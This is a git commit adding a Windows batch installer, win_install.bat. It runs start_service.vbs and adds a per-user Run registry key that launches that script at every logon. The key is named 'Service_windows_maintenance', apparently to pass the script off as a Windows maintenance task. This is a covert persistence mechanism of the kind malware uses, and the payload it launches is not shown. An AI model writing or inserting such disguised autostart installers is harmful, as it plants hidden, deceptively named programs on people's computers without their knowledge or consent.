3e9744b997d87a1d04dfa548b72163ce95eb28d8
M0cklngjay <45143862+M0cklngjay@users.noreply.github.com>
2020-11-05 12:47:14 +0100

    Add files via upload

---
+++ win_install.bat
@@ -0,0 +1,4 @@
+@echo off
+pushd %~dp0
+cscript start_service.vbs
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Service_windows_maintenance /t REG_EXPAND_SZ /d "C:\Users\%username%\start_service.vbs" /f
